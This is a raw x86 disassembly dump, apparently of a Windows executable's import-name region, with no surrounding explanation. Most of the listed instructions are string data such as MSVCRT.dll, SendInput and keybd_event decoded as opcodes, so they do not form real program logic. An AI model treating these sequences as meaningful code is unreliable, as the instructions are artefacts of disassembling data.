  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
